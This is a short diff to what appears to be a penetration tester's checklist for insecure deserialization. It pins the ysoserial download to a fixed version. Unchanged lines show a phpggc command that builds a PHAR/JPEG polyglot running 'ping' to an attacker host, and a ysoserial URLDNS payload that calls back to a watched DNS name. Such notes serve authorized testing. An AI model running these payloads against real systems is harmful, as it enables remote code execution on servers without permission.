@@ -41,7 +41,7 @@ phpggc -pj dummy.jpg -o avatar.phar.jpg monolog/rce1 system 'ping -c 2 <LHOST>'
 - [ ] Not installed: sudo apt install phpggc
 
 ## Java: ysoserial
-wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
 - [ ] Chains match the libraries on the classpath: error messages, WEB-INF/lib, framework versions
 URLDNS needs no library at all. With THE-DNS-NAME a name whose lookups I can see, such as from interactsh:
 java --add-opens=java.base/java.net=ALL-UNNAMED -jar ysoserial-all.jar URLDNS 'http://THE-DNS-NAME/' | base64 -w 0
